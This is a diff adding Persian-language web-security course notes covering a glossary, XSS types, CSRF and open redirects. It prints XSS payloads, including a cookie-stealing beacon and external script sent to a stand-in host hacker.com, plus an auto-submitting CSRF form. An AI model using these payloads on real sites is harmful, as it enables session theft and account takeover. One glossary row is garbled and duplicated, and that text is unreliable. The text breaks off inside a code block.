@@ -1,0 +1,926 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 04 — Web Structure & Security</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;400;500;600;700;900&family=Fira+Code:wght@400;500&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0d0f14;
+    --surface: #13161e;
+    --surface2: #1a1e2a;
+    --border: #252a38;
+    --accent: #6c8aff;
+    --accent2: #ff6b6b;
+    --accent3: #4ecdc4;
+    --accent4: #ffd166;
+    --text: #e2e8f8;
+    --text-muted: #8892aa;
+    --text-faint: #4a5270;
+    --code-bg: #0a0c12;
+    --green: #52e3a0;
+    --purple: #b48eff;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Vazirmatn', sans-serif;
+    font-size: 16px;
+    line-height: 1.8;
+    min-height: 100vh;
+  }
+
+  /* Subtle grid background */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(108,138,255,0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(108,138,255,0.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  .container {
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 0 24px 80px;
+    position: relative;
+    z-index: 1;
+  }
+
+  /* ===== HEADER ===== */
+  header {
+    padding: 60px 0 40px;
+    border-bottom: 1px solid var(--border);
+    margin-bottom: 48px;
+    position: relative;
+  }
+
+  .module-tag {
+    display: inline-block;
+    font-size: 11px;
+    font-weight: 600;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    color: var(--accent);
+    background: rgba(108,138,255,0.1);
+    border: 1px solid rgba(108,138,255,0.25);
+    padding: 4px 14px;
+    border-radius: 4px;
+    margin-bottom: 20px;
+  }
+
+  h1.main-title {
+    font-family: 'Playfair Display', serif;
+    font-size: clamp(32px, 5vw, 52px);
+    font-weight: 700;
+    color: var(--text);
+    direction: ltr;
+    text-align: right;
+    line-height: 1.2;
+    margin-bottom: 12px;
+  }
+
+  .subtitle {
+    color: var(--text-muted);
+    font-size: 15px;
+    font-weight: 300;
+  }
+
+  /* ===== TOC ===== */
+  .toc {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-right: 3px solid var(--accent);
+    border-radius: 8px;
+    padding: 24px 28px;
+    margin-bottom: 48px;
+  }
+
+  .toc-title {
+    font-size: 12px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin-bottom: 16px;
+    font-weight: 600;
+  }
+
+  .toc ol {
+    list-style: none;
+    counter-reset: toc;
+  }
+
+  .toc li {
+    counter-increment: toc;
+    padding: 5px 0;
+    border-bottom: 1px solid var(--border);
+  }
+  .toc li:last-child { border-bottom: none; }
+
+  .toc a {
+    color: var(--text-muted);
+    text-decoration: none;
+    font-size: 14px;
+    transition: color 0.2s;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  .toc a::before {
+    content: "0" counter(toc);
+    font-family: 'Fira Code', monospace;
+    font-size: 11px;
+    color: var(--text-faint);
+    min-width: 24px;
+  }
+  .toc a:hover { color: var(--accent); }
+
+  /* ===== SECTIONS ===== */
+  .section {
+    margin-bottom: 56px;
+    animation: fadeUp 0.5s ease both;
+  }
+
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(20px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  .section-header {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    margin-bottom: 28px;
+    padding-bottom: 16px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .section-num {
+    font-family: 'Fira Code', monospace;
+    font-size: 13px;
+    color: var(--text-faint);
+    min-width: 28px;
+  }
+
+  h2.section-title {
+    font-size: 22px;
+    font-weight: 700;
+    color: var(--text);
+  }
+
+  h3.sub-title {
+    font-size: 15px;
+    font-weight: 600;
+    color: var(--accent3);
+    margin: 24px 0 12px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  h3.sub-title::before {
+    content: '';
+    display: inline-block;
+    width: 14px;
+    height: 2px;
+    background: var(--accent3);
+    flex-shrink: 0;
+  }
+
+  /* ===== GLOSSARY TABLE ===== */
+  .glossary-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 14px;
+    margin: 16px 0;
+  }
+
+  .glossary-table thead th {
+    background: var(--surface2);
+    padding: 10px 16px;
+    text-align: right;
+    font-size: 11px;
+    letter-spacing: 1.5px;
+    text-transform: uppercase;
+    color: var(--text-muted);
+    font-weight: 600;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .glossary-table tbody tr {
+    border-bottom: 1px solid var(--border);
+    transition: background 0.15s;
+  }
+
+  .glossary-table tbody tr:hover {
+    background: rgba(108,138,255,0.04);
+  }
+
+  .glossary-table td {
+    padding: 10px 16px;
+    vertical-align: top;
+  }
+
+  .glossary-table td:first-child {
+    font-family: 'Fira Code', monospace;
+    font-size: 12.5px;
+    color: var(--accent2);
+    font-weight: 500;
+    white-space: nowrap;
+    direction: ltr;
+    text-align: left;
+    border-left: none;
+    border-right: 2px solid var(--border);
+  }
+
+  .glossary-table td:last-child {
+    color: var(--text-muted);
+    font-size: 13.5px;
+    line-height: 1.7;
+  }
+
+  /* ===== CARDS ===== */
+  .card-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+    gap: 16px;
+    margin: 16px 0;
+  }
+
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 18px 20px;
+    transition: border-color 0.2s, transform 0.2s;
+  }
+
+  .card:hover {
+    border-color: var(--accent);
+    transform: translateY(-2px);
+  }
+
+  .card-label {
+    font-family: 'Fira Code', monospace;
+    font-size: 12px;
+    color: var(--accent);
+    margin-bottom: 8px;
+    font-weight: 500;
+  }
+
+  .card p {
+    font-size: 13.5px;
+    color: var(--text-muted);
+    line-height: 1.65;
+  }
+
+  /* ===== XSS TYPE CARDS ===== */
+  .xss-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 14px;
+    margin: 16px 0;
+  }
+
+  @media (max-width: 600px) { .xss-grid { grid-template-columns: 1fr; } }
+
+  .xss-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 18px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .xss-card::before {
+    content: '';
+    position: absolute;
+    top: 0; right: 0;
+    width: 3px;
+    height: 100%;
+  }
+
+  .xss-card.reflected::before { background: var(--accent4); }
+  .xss-card.stored::before { background: var(--accent2); }
+  .xss-card.dom::before { background: var(--accent3); }
+  .xss-card.blind::before { background: var(--purple); }
+
+  .xss-type {
+    font-family: 'Fira Code', monospace;
+    font-size: 12px;
+    font-weight: 600;
+    margin-bottom: 8px;
+  }
+
+  .xss-card.reflected .xss-type { color: var(--accent4); }
+  .xss-card.stored .xss-type { color: var(--accent2); }
+  .xss-card.dom .xss-type { color: var(--accent3); }
+  .xss-card.blind .xss-type { color: var(--purple); }
+
+  .xss-card p {
+    font-size: 13px;
+    color: var(--text-muted);
+    line-height: 1.65;
+  }
+
+  /* ===== CODE BLOCKS ===== */
+  .code-block {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    margin: 14px 0;
+    overflow: hidden;
+  }
+
+  .code-header {
+    padding: 8px 16px;
+    background: var(--surface2);
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .code-dot { width: 10px; height: 10px; border-radius: 50%; }
+  .code-dot.red { background: #ff5f57; }
+  .code-dot.yellow { background: #ffbd2e; }
+  .code-dot.green { background: #28c940; }
+
+  .code-lang {
+    font-family: 'Fira Code', monospace;
+    font-size: 11px;
+    color: var(--text-faint);
+    margin-right: auto;
+    direction: ltr;
+  }
+
+  .code-block pre {
+    padding: 16px 20px;
+    font-family: 'Fira Code', monospace;
+    font-size: 13px;
+    line-height: 1.7;
+    color: #a8c0ff;
+    direction: ltr;
+    text-align: left;
+    overflow-x: auto;
+  }
+
+  .code-block pre .kw { color: #ff79c6; }
+  .code-block pre .str { color: #f1fa8c; }
+  .code-block pre .cmt { color: #6272a4; font-style: italic; }
+  .code-block pre .fn { color: #50fa7b; }
+  .code-block pre .tag { color: #ff6b6b; }
+  .code-block pre .attr { color: #ffb86c; }
+  .code-block pre .val { color: #f1fa8c; }
+
+  /* ===== LISTS ===== */
+  .styled-list {
+    list-style: none;
+    margin: 12px 0;
+  }
+
+  .styled-list li {
+    padding: 7px 0 7px 0;
+    padding-right: 20px;
+    color: var(--text-muted);
+    font-size: 14.5px;
+    border-bottom: 1px solid rgba(255,255,255,0.04);
+    position: relative;
+  }
+
+  .styled-list li::before {
+    content: '›';
+    position: absolute;
+    right: 0;
+    color: var(--accent);
+    font-size: 18px;
+    line-height: 1;
+    top: 8px;
+  }
+
+  .styled-list li strong {
+    color: var(--text);
+    font-weight: 600;
+  }
+
+  .styled-list li code {
+    font-family: 'Fira Code', monospace;
+    font-size: 12px;
+    color: var(--accent2);
+    background: rgba(255,107,107,0.1);
+    padding: 1px 6px;
+    border-radius: 3px;
+  }
+
+  /* ===== LIKE TABLE ===== */
+  .like-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 14px;
+    margin: 12px 0;
+    direction: ltr;
+  }
+
+  .like-table th {
+    background: var(--surface2);
+    padding: 10px 16px;
+    text-align: left;
+    color: var(--text-muted);
+    font-size: 12px;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .like-table td {
+    padding: 10px 16px;
+    border-bottom: 1px solid var(--border);
+    color: var(--text-muted);
+    font-size: 13.5px;
+  }
+
+  .like-table td:first-child {
+    font-family: 'Fira Code', monospace;
+    color: var(--accent3);
+    font-weight: 500;
+  }
+
+  /* ===== CALLOUT ===== */
+  .callout {
+    background: rgba(108,138,255,0.06);
+    border-right: 3px solid var(--accent);
+    border-radius: 0 6px 6px 0;
+    padding: 14px 18px;
+    margin: 16px 0;
+    font-size: 14px;
+    color: var(--text-muted);
+    line-height: 1.7;
+  }
+
+  .callout.danger {
+    background: rgba(255,107,107,0.06);
+    border-color: var(--accent2);
+  }
+
+  .callout.success {
+    background: rgba(82,227,160,0.06);
+    border-color: var(--green);
+  }
+
+  /* ===== DIVIDER ===== */
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 40px 0;
+  }
+
+  /* ===== INLINE CODE ===== */
+  p code, li code {
+    font-family: 'Fira Code', monospace;
+    font-size: 12.5px;
+    color: var(--accent2);
+    background: rgba(255,107,107,0.1);
+    padding: 1px 6px;
+    border-radius: 3px;
+  }
+
+  /* ===== SCROLL ===== */
+  ::-webkit-scrollbar { width: 6px; height: 6px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+  ::-webkit-scrollbar-thumb:hover { background: var(--accent); }
+
+  /* ===== BACK TO TOP ===== */
+  .back-top {
+    position: fixed;
+    bottom: 30px;
+    left: 30px;
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    color: var(--text-muted);
+    width: 40px;
+    height: 40px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    font-size: 18px;
+    text-decoration: none;
+    transition: all 0.2s;
+    z-index: 100;
+  }
+
+  .back-top:hover {
+    background: var(--accent);
+    color: white;
+    border-color: var(--accent);
+  }
+
+  /* ===== PROGRESS BAR ===== */
+  #progress {
+    position: fixed;
+    top: 0; left: 0;
+    height: 2px;
+    background: linear-gradient(90deg, var(--accent), var(--accent3));
+    z-index: 999;
+    transition: width 0.1s;
+  }
+
+  .tag-list {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 8px;
+    margin: 12px 0;
+  }
+
+  .tag {
+    font-family: 'Fira Code', monospace;
+    font-size: 12px;
+    padding: 4px 10px;
+    border-radius: 4px;
+    border: 1px solid;
+  }
+
+  .tag.blue { color: var(--accent); border-color: rgba(108,138,255,0.3); background: rgba(108,138,255,0.08); }
+  .tag.red { color: var(--accent2); border-color: rgba(255,107,107,0.3); background: rgba(255,107,107,0.08); }
+  .tag.teal { color: var(--accent3); border-color: rgba(78,205,196,0.3); background: rgba(78,205,196,0.08); }
+  .tag.yellow { color: var(--accent4); border-color: rgba(255,209,102,0.3); background: rgba(255,209,102,0.08); }
+  .tag.purple { color: var(--purple); border-color: rgba(180,142,255,0.3); background: rgba(180,142,255,0.08); }
+
+  p { color: var(--text-muted); font-size: 14.5px; margin: 8px 0; line-height: 1.8; }
+</style>
+</head>
+<body>
+
+<div id="progress"></div>
+
+<div class="container">
+
+  <header>
+    <div class="module-tag">Module 04</div>
+    <h1 class="main-title">Web Structure & Security</h1>
+    <p class="subtitle">جزوه کامل ساختار وب و آسیب‌پذیری‌های امنیتی</p>
+  </header>
+
+  <!-- TOC -->
+  <nav class="toc">
+    <div class="toc-title">فهرست مطالب</div>
+    <ol>
+      <li><a href="#glossary">فرهنگ اصطلاحات</a></li>
+      <li><a href="#website-vs-app">وب‌سایت در مقابل وب‌اپلیکیشن</a></li>
+      <li><a href="#frameworks">فریم‌ورک‌ها</a></li>
+      <li><a href="#distribution">توزیع وب‌اپلیکیشن</a></li>
+      <li><a href="#client-side">آسیب‌پذیری‌های کلاینت‌ساید</a></li>
+      <li><a href="#server-side">آسیب‌پذیری‌های سرورساید</a></li>
+      <li><a href="#database">پایگاه داده</a></li>
+      <li><a href="#sql">دستورات SQL</a></li>
+    </ol>
+  </nav>
+
+  <!-- SECTION 1: GLOSSARY -->
+  <div class="section" id="glossary">
+    <div class="section-header">
+      <span class="section-num">01</span>
+      <h2 class="section-title">فرهنگ اصطلاحات / Glossary</h2>
+    </div>
+
+    <table class="glossary-table">
+      <thead>
+        <tr>
+          <th>اصطلاح / Term</th>
+          <th>تعریف / Definition</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr><td>Web Site</td><td>مجموعه‌ای از صفحات HTML ثابت که اطلاعات نمایش می‌دهند و تعامل کمی با کاربر دارند.</td></tr>
+        <tr><td>Web Application</td><td>نرم‌افزاری تحت وب که پردازش پویا انجام می‌دهد، با پایگاه داده ارتباط دارد و تجربه کاربری تعاملی ایجاد می‌کند.</td></tr>
+        <tr><td>Static Content</td><td>محتوای ثابت که بدون پردازش سمت‌سرور مستقیماً برای کاربر ارسال می‌شود (HTML, CSS, JS, PNG).</td></tr>
+        <tr><td>Dynamic Content</td><td>محتوایی که در لحظه درخواست توسط سرور تولید می‌شود (PHP, ASP, JSP).</td></tr>
+        <tr><td>Framework</td><td>مجموعه‌ای از کتابخانه‌ها و ابزارهاPHP, ASP, JSP).</td></tr>
+        <tr><td>Framework</td><td>مجموعه‌ای از کتابخانه‌ها و ابزارهاند.</td></tr>
+        <tr><td>Open Source</td><td>نرم‌افزاری که کد منبع آن در دسترس عموم است و می‌توان آن را آزادانه استفاده، تغییر و توزیع کرد.</td></tr>
+        <tr><td>Closed Source</td><td>نرم‌افزاری که کد منبع آن محرمانه است و فقط توسط سازنده قابل دسترسی است.</td></tr>
+        <tr><td>Client Side</td><td>عملیاتی که در مرورگر کاربر اجرا می‌شود (HTML, CSS, JavaScript).</td></tr>
+        <tr><td>Server Side</td><td>عملیاتی که روی سرور وب اجرا می‌شود و نتیجه آن به مرورگر ارسال می‌شود.</td></tr>
+        <tr><td>XSS</td><td>Cross-Site Scripting — تزریق کد مخرب JavaScript در صفحات وب برای اجرا در مرورگر قربانی.</td></tr>
+        <tr><td>CSRF</td><td>Cross-Site Request Forgery — جعل درخواست از سمت کاربر؛ هکر کاربر احراز هویت شده را فریب می‌دهد تا درخواست ناخواسته ارسال کند.</td></tr>
+        <tr><td>SQL Injection</td><td>تزریق دستورات SQL مخرب به ورودی‌های برنامه برای دستکاری یا استخراج اطلاعات پایگاه داده.</td></tr>
+        <tr><td>SSRF</td><td>Server-Side Request Forgery — مجبور کردن سرور به ارسال درخواست به منابع داخلی یا خارجی.</td></tr>
+        <tr><td>PII</td><td>Personally Identifiable Information — اطلاعات شناسایی شخصی مانند نام، ایمیل، شماره ملی.</td></tr>
+        <tr><td>Sensitive Data Exposure</td><td>افشای اطلاعات حساس به دلیل مدیریت نادرست داده در سمت کلاینت یا سرور.</td></tr>
+        <tr><td>Open Redirect</td><td>آسیب‌پذیری‌ای که اجازه می‌دهد کاربر به URL دلخواه مهاجم هدایت شود.</td></tr>
+        <tr><td>Reflected XSS (RXSS)</td><td>نوعی XSS که payload در URL تعبیه شده و فوراً در پاسخ سرور بازتاب می‌یابد.</td></tr>
+        <tr><td>Stored XSS (SXSS)</td><td>نوعی XSS که payload در پایگاه داده ذخیره شده و هر بار صفحه لود می‌شود اجرا می‌گردد.</td></tr>
+        <tr><td>DOM XSS (DXSS)</td><td>نوعی XSS که در سمت کلاینت و از طریق دستکاری DOM اجرا می‌شود بدون ارسال payload به سرور.</td></tr>
+        <tr><td>Blind XSS (BXSS)</td><td>نوعی XSS که اجرای آن در پنل ادمین یا محیطی است که مهاجم مستقیماً نمی‌بیند.</td></tr>
+        <tr><td>CSRF Token</td><td>یک توکن تصادفی منحصربه‌فرد که با هر درخواست ارسال می‌شود تا از جعل درخواست جلوگیری کند.</td></tr>
+        <tr><td>Command Injection</td><td>تزریق دستورات سیستم‌عامل به ورودی برنامه برای اجرای دستورات مخرب روی سرور.</td></tr>
+        <tr><td>Shell Upload</td><td>آپلود فایل اجرایی مخرب (مثل PHP shell) به سرور برای کنترل از راه دور.</td></tr>
+        <tr><td>CRUD</td><td>Create, Read, Update, Delete — چهار عملیات پایه در پایگاه داده.</td></tr>
+        <tr><td>SQL UNION</td><td>دستور ترکیب نتایج دو یا چند SELECT با شرط یکسان بودن تعداد ستون‌ها.</td></tr>
+        <tr><td>Event Handler</td><td>تابعی در JavaScript که در پاسخ به یک رویداد (کلیک، خطا و ...) اجرا می‌شود.</td></tr>
+        <tr><td>DOM Source</td><td>محل دریافت ورودی کاربر در DOM مانند location.hash یا location.search.</td></tr>
+        <tr><td>DOM Sink</td><td>محلی در DOM که داده‌های تحت کنترل کاربر در آن درج می‌شوند مانند innerHTML.</td></tr>
+        <tr><td>Path Traversal</td><td>آسیب‌پذیری دسترسی به فایل‌های خارج از دایرکتوری مجاز از طریق مسیرهای نسبی (../).</td></tr>
+        <tr><td>SSO</td><td>Single Sign-On — سیستم احراز هویت یکپارچه که با یک ورود به چند سرویس دسترسی می‌دهد.</td></tr>
+        <tr><td>Relational DB</td><td>پایگاه داده‌ای که داده‌ها را در جداول مرتبط ذخیره می‌کند و از SQL استفاده می‌کند.</td></tr>
+        <tr><td>NoSQL DB</td><td>پایگاه داده غیررابطه‌ای که داده‌ها را به صورت سند، گراف یا کلید-مقدار ذخیره می‌کند.</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <hr class="divider">
+
+  <!-- SECTION 2: Website vs App -->
+  <div class="section" id="website-vs-app">
+    <div class="section-header">
+      <span class="section-num">02</span>
+      <h2 class="section-title">وب‌سایت در مقابل وب‌اپلیکیشن</h2>
+    </div>
+
+    <p>وب‌سایت مجموعه‌ای از صفحات مرتبط است که معمولاً اطلاعات ثابت نمایش می‌دهند. وب‌اپلیکیشن نرم‌افزاری تعاملی است که در مرورگر اجرا شده و پردازش پیچیده‌تری انجام می‌دهد.</p>
+
+    <h3 class="sub-title">محتوای استاتیک (Static)</h3>
+    <div class="tag-list">
+      <span class="tag blue">.html</span>
+      <span class="tag blue">.css</span>
+      <span class="tag blue">.js</span>
+      <span class="tag blue">.png</span>
+      <span class="tag blue">.jpg</span>
+    </div>
+    <ul class="styled-list">
+      <li><strong>.html</strong> — ساختار صفحه وب با زبان نشانه‌گذاری</li>
+      <li><strong>.css</strong> — استایل‌شیت برای طراحی ظاهر صفحات</li>
+      <li><strong>.js</strong> — اسکریپت جاوااسکریپت برای تعامل در مرورگر</li>
+      <li><strong>.png / .jpg</strong> — تصاویر گرافیکی</li>
+    </ul>
+
+    <h3 class="sub-title">محتوای دینامیک (Dynamic)</h3>
+    <div class="tag-list">
+      <span class="tag red">.php</span>
+      <span class="tag red">.asp</span>
+      <span class="tag red">.jsp</span>
+    </div>
+    <ul class="styled-list">
+      <li><strong>.php</strong> — PHP — زبان سرور ساید متداول برای توسعه وب</li>
+      <li><strong>.asp / .aspx</strong> — ASP.NET — فریم‌ورک مایکروسافت برای وب</li>
+      <li><strong>.jsp</strong> — JavaServer Pages — صفحات سرور ساید با زبان جاوا</li>
+    </ul>
+  </div>
+
+  <hr class="divider">
+
+  <!-- SECTION 3: Frameworks -->
+  <div class="section" id="frameworks">
+    <div class="section-header">
+      <span class="section-num">03</span>
+      <h2 class="section-title">فریم‌ورک‌ها (Frameworks)</h2>
+    </div>
+
+    <h3 class="sub-title">Backend (سرورساید)</h3>
+    <div class="card-grid">
+      <div class="card">
+        <div class="card-label">Laravel (PHP)</div>
+        <p>فریم‌ورک PHP مدرن با معماری MVC — نسخه فعلی ۱۰</p>
+      </div>
+      <div class="card">
+        <div class="card-label">Path Traversal در PHP</div>
+        <p>آسیب‌پذیری دسترسی به فایل‌های ممنوع — نسخه‌های قدیمی PHP آسیب‌پذیر بودند</p>
+      </div>
+    </div>
+
+    <h3 class="sub-title">Frontend (کلاینت‌ساید)</h3>
+    <div class="card-grid">
+      <div class="card">
+        <div class="card-label">Angular</div>
+        <p>فریم‌ورک گوگل برای ساخت SPA با TypeScript</p>
+      </div>
+      <div class="card">
+        <div class="card-label">React</div>
+        <p>کتابخانه فیسبوک برای ساخت UI مبتنی بر کامپوننت</p>
+      </div>
+      <div class="card">
+        <div class="card-label">Vue.js</div>
+        <p>فریم‌ورک سبک و انعطاف‌پذیر برای ساخت رابط کاربری</p>
+      </div>
+      <div class="card">
+        <div class="card-label">jQuery</div>
+        <p>کتابخانه جاوااسکریپت برای ساده‌سازی DOM manipulation</p>
+      </div>
+    </div>
+  </div>
+
+  <hr class="divider">
+
+  <!-- SECTION 4: Distribution -->
+  <div class="section" id="distribution">
+    <div class="section-header">
+      <span class="section-num">04</span>
+      <h2 class="section-title">توزیع وب‌اپلیکیشن</h2>
+    </div>
+
+    <h3 class="sub-title">متن‌باز (Open Source)</h3>
+    <ul class="styled-list">
+      <li><strong>WordPress</strong> — CMS محبوب نوشته‌شده به PHP — مناسب وبلاگ، فروشگاه، پورتال</li>
+      <li><strong>Joomla</strong> — CMS متن‌باز برای سایت‌های پیچیده‌تر</li>
+    </ul>
+
+    <h3 class="sub-title">منبع‌بسته (Closed Source)</h3>
+    <ul class="styled-list">
+      <li><strong>Shopify</strong> — پلتفرم تجارت الکترونیک SaaS — کد آن در دسترس نیست</li>
+    </ul>
+  </div>
+
+  <hr class="divider">
+
+  <!-- SECTION 5: Client Side -->
+  <div class="section" id="client-side">
+    <div class="section-header">
+      <span class="section-num">05</span>
+      <h2 class="section-title">آسیب‌پذیری‌های کلاینت‌ساید</h2>
+    </div>
+
+    <!-- XSS -->
+    <h3 class="sub-title">XSS — Cross-Site Scripting</h3>
+    <div class="callout danger">
+      تزریق کد JavaScript مخرب به صفحات وب که در مرورگر قربانی اجرا می‌شود. هدف اصلی: دزدیدن session cookie، تغییر محتوای صفحه، یا اجرای کد به‌جای کاربر.
+    </div>
+
+    <h3 class="sub-title">روش‌های تزریق JavaScript</h3>
+
+    <p style="color:var(--text-muted); font-size:13.5px; margin-bottom:6px;">۱. Inline Script Tag:</p>
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dot red"></div><div class="code-dot yellow"></div><div class="code-dot green"></div>
+        <span class="code-lang">html</span>
+      </div>
+      <pre>&lt;<span class="tag">script</span>&gt;<span class="fn">alert</span>(<span class="str">"XSS"</span>)&lt;/<span class="tag">script</span>&gt;</pre>
+    </div>
+
+    <p style="color:var(--text-muted); font-size:13.5px; margin-bottom:6px;">۲. External Script از سرور هکر:</p>
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dot red"></div><div class="code-dot yellow"></div><div class="code-dot green"></div>
+        <span class="code-lang">html</span>
+      </div>
+      <pre>&lt;<span class="tag">script</span> <span class="attr">src</span>=<span class="str">"https://hacker.com/1.js"</span>&gt;&lt;/<span class="tag">script</span>&gt;</pre>
+    </div>
+
+    <p style="color:var(--text-muted); font-size:13.5px; margin-bottom:6px;">۳. Event Handler (رویداد HTML):</p>
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dot red"></div><div class="code-dot yellow"></div><div class="code-dot green"></div>
+        <span class="code-lang">html</span>
+      </div>
+      <pre>&lt;<span class="tag">img</span> <span class="attr">src</span>=<span class="str">invalid</span> <span class="attr">onerror</span>=<span class="str">"alert(10)"</span>&gt;</pre>
+    </div>
+
+    <h3 class="sub-title">دزدیدن کوکی با XSS</h3>
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dot red"></div><div class="code-dot yellow"></div><div class="code-dot green"></div>
+        <span class="code-lang">javascript</span>
+      </div>
+      <pre><span class="cmt">// روش ۱: از طریق script tag</span>
+<span class="kw">var</span> i = <span class="kw">new</span> <span class="fn">Image</span>();
+i.src = <span class="str">"https://hacker.com/?cookie="</span> + document.cookie;
+
+<span class="cmt">// روش ۲: از طریق event handler</span>
+<span class="cmt">// &lt;img src=invalid onerror="i=new Image;i.src='https://hacker.com/?cookie='+document.cookie"&gt;</span></pre>
+    </div>
+
+    <h3 class="sub-title">انواع XSS</h3>
+    <div class="xss-grid">
+      <div class="xss-card reflected">
+        <div class="xss-type">Reflected XSS (RXSS)</div>
+        <p>Payload در URL قرار گرفته، سرور آن را بدون sanitize در صفحه بازتاب می‌دهد. کاربر باید لینک مخرب را باز کند.</p>
+      </div>
+      <div class="xss-card stored">
+        <div class="xss-type">Stored XSS (SXSS)</div>
+        <p>Payload در پایگاه داده ذخیره می‌شود (مثل کامنت). هر بار صفحه بارگذاری شود اجرا می‌گردد — خطرناک‌ترین نوع!</p>
+      </div>
+      <div class="xss-card dom">
+        <div class="xss-type">DOM XSS (DXSS)</div>
+        <p>Source → location.hash دریافت ورودی کاربر. Sink → innerHTML اجرای آن. بدون ارسال به سرور.</p>
+      </div>
+      <div class="xss-card blind">
+        <div class="xss-type">Blind XSS (BXSS)</div>
+        <p>Payload در پنل ادمین یا محیطی اجرا می‌شود که مهاجم دسترسی مستقیم ندارد. از external script استفاده می‌شود.</p>
+      </div>
+    </div>
+
+    <h3 class="sub-title">Payload شکستن Context</h3>
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dot red"></div><div class="code-dot yellow"></div><div class="code-dot green"></div>
+        <span class="code-lang">payload</span>
+      </div>
+      <pre>'"></textarea></style></noscript></script>
+&lt;script src="https://hacker.com/1.js"&gt;&lt;/script&gt;</pre>
+    </div>
+
+    <!-- CSRF -->
+    <hr class="divider" style="margin: 32px 0;">
+    <h3 class="sub-title">CSRF — Cross-Site Request Forgery</h3>
+    <div class="callout danger">
+      مهاجم کاربر احراز هویت‌شده را فریب می‌دهد تا درخواست ناخواسته‌ای به سایت هدف ارسال کند. کاربر نمی‌داند چه اتفاقی افتاده!
+    </div>
+
+    <p>مثال: تغییر ایمیل کاربر بدون اطلاع او:</p>
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dot red"></div><div class="code-dot yellow"></div><div class="code-dot green"></div>
+        <span class="code-lang">html — صفحه مخرب هکر</span>
+      </div>
+      <pre>&lt;<span class="tag">form</span> <span class="attr">method</span>=<span class="str">"POST"</span> <span class="attr">action</span>=<span class="str">"https://target.com/change-email"</span>&gt;
+  &lt;<span class="tag">input</span> <span class="attr">type</span>=<span class="str">"hidden"</span> <span class="attr">name</span>=<span class="str">"email"</span> <span class="attr">value</span>=<span class="str">"hacker@evil.com"</span>&gt;
+  &lt;<span class="tag">script</span>&gt;document.forms[<span class="str">0</span>].<span class="fn">submit</span>();&lt;/<span class="tag">script</span>&gt;
+&lt;/<span class="tag">form</span>&gt;</pre>
+    </div>
+
+    <h3 class="sub-title">محافظت: CSRF Token</h3>
+    <ul class="styled-list">
+      <li><strong>در Header:</strong> <code>X-CSRF-Token: lxfgvads...random...</code></li>
+      <li><strong>در Body:</strong> <code>email=user@test.com&csrf=lxfgvads...random...</code></li>
+    </ul>
+
+    <!-- Open Redirect -->
+    <hr class="divider" style="margin: 32px 0;">
+    <h3 class="sub-title">Open Redirect</h3>
+    <div class="callout">
+      سایت کاربر را به URL دلخواه مهاجم هدایت می‌کند. معمولاً از طریق پارامترهای redirect استفاده می‌شود.
+    </div>
+
+    <h3 class="sub-title">پارامترهای رایج Open Redirect</h3>
+    <div class="tag-list">
+      <span class="tag teal">redirect</span>
+      <span class="tag teal">return</span>
+      <span class="tag teal">next</span>
+      <span class="tag teal">callback</span>
+      <span class="tag teal">goto</span>
+      <span class="tag teal">continue</span>
+      <span class="tag teal">red_ir</span>
+      <span class="tag teal">go_to</span>
+    </div>
+
+    <h3 class="sub-title">زنجیره: Open Redirect → XSS</h3>
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dot red"></div><div class="code-dot yellow"></div><div class="code-dot green"></div>
+        <span class="code-lang">attack chain</span>
+      </div>
+      <pre><span class="cmt">// حمله از طریق javascript: URI در href</span>
+&lt;<span class="tag">a</span> <span class="attr">href</span>=<span class="str">"javascript:alert(10)"</span>&gt;Click me&lt;/<span class="tag">a</span>&gt;
+
